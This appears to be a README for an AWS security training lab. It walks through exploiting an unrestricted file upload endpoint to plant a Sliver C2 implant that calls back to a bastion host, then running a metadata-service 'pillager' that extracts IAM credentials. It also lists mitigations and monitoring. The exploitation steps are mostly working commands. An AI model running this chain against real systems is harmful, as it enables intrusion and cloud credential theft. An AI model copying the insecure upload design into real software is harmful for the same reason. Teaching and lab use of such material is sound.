# Branch 4: File Upload Vulnerability & Sliver C2 Exploitation

## Overview

Branch 4 introduces an advanced exploitation scenario combining:
- **File Upload Vulnerability**: Unrestricted file upload allowing arbitrary code execution
- **Sliver C2 Framework**: Command and control infrastructure for post-exploitation
- **IMDS Pillaging Module**: Custom Sliver module for automated credential extraction

## Vulnerability Details

### File Upload Endpoint
The web server now exposes two dangerous endpoints:
- `POST /upload` - Accepts any file without validation
- `GET /uploads/{filename}` - Serves uploaded files

**Security Issues:**
1. No file type validation
2. No filename sanitization (path traversal possible)
3. Uploaded files are made executable (chmod 755)
4. Direct file serving without content-type restrictions

### Attack Chain

1. **Initial Access**: Upload Sliver implant via vulnerable endpoint
2. **Execution**: Trigger implant execution on web server
3. **C2 Connection**: Implant connects back to Sliver server on bastion
4. **IMDS Exploitation**: Use custom module to extract AWS credentials
5. **Lateral Movement**: Use stolen credentials for further access

## Infrastructure Setup

### Deploy Infrastructure
```bash
cd terraform
terraform init
terraform plan -var-file=terraform.tfvars
terraform apply -auto-approve
```

### Components
- **Bastion Host**: Runs Sliver C2 server
- **Web Server**: Vulnerable application with file upload
- **VPC**: Network isolation with controlled access

## Exploitation Guide

### Step 1: Access Bastion Host
```bash
ssh -i your-key.pem ec2-user@<bastion-public-ip>
```

### Step 2: Generate Sliver Implant
```bash
# Automatic implant generation
./generate-implant.sh

# Or manual generation
/opt/sliver-server generate --mtls <bastion-private-ip>:8443 \
  --os linux --arch amd64 \
  --format exe \
  --name web-server-implant \
  --save /home/ec2-user/implant.elf
```

### Step 3: Upload Implant to Web Server
```bash
# Using the automated script
./upload-implant.sh http://<web-server-private-ip>:8080

# Or manual upload
curl -X POST -F 'file=@implant.elf' \
  http://<web-server-private-ip>:8080/upload
```

### Step 4: Execute Implant
```bash
# SSH to web server and execute
ssh -i your-key.pem ec2-user@<web-server-ip>
/var/www/uploads/implant.elf &

# Or trigger via HTTP request if server executes uploads
curl http://<web-server-ip>:8080/uploads/implant.elf
```

### Step 5: Interact with C2
```bash
# On bastion, start Sliver client
/opt/sliver-server client

# In Sliver console
sliver > sessions
sliver > use <session-id>
sliver (session) > info
```

### Step 6: Run IMDS Pillager Module
```bash
# From within Sliver session
sliver (session) > upload /home/ec2-user/imds-pillager.sh /tmp/
sliver (session) > chmod +x /tmp/imds-pillager.sh
sliver (session) > execute /tmp/imds-pillager.sh

# Or run directly from bastion
./imds-pillager.sh
```

## IMDS Pillager Module

The custom Sliver module extracts:
- Instance metadata (ID, type, region, etc.)
- IAM role credentials
- Network interface details
- User data scripts

### Module Output
```json
{
  "timestamp": "2024-01-01T00:00:00",
  "imds_version": "v1 (vulnerable)",
  "instance_metadata": {
    "instance-id": "i-xxx",
    "instance-type": "t3.micro",
    "ami-id": "ami-xxx",
    "region": "us-east-1"
  },
  "iam_credentials": {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "***",
    "Token": "***",
    "Expiration": "2024-01-01T06:00:00Z"
  }
}
```

## Security Considerations

### Mitigations
1. **File Upload Security**:
   - Implement file type validation (whitelist)
   - Sanitize filenames
   - Store uploads outside web root
   - Never make uploads executable
   - Scan uploads with antivirus

2. **IMDSv2 Enforcement**:
   - Require session tokens for IMDS access
   - Limit hop count to 1
   - Monitor IMDS access patterns

3. **Network Segmentation**:
   - Isolate web servers from sensitive resources
   - Implement strict security group rules
   - Use VPC endpoints for AWS services

4. **Monitoring**:
   - CloudWatch alerts for suspicious file uploads
   - Monitor for unusual IMDS access patterns
   - Track IAM credential usage

## Logs and Monitoring

### CloudWatch Log Groups
- `/aws/ec2/imdsv1-lab/bastion` - Bastion host logs
- `/aws/ec2/imdsv1-lab/web-server` - Web server logs
- `/var/log/sliver.log` - Sliver C2 logs

### Key Events to Monitor
- File upload attempts
- IMDS access from web server
- Outbound connections to C2
- IAM credential usage anomalies

## Cleanup

```bash
# Destroy infrastructure
cd terraform
terraform destroy -auto-approve

# Remove local files
rm -rf sliver-modules/
rm BRANCH-4-README.md
```

## Educational Notes

This branch demonstrates:
1. **Defense in Depth**: Multiple security layers needed
2. **Kill Chain**: How attackers chain vulnerabilities
3. **Post-Exploitation**: What happens after initial access
4. **C2 Infrastructure**: How attackers maintain persistence
5. **Credential Theft**: Impact of IMDS exposure

**Remember**: This is for educational purposes only. Never deploy vulnerable code to production environments.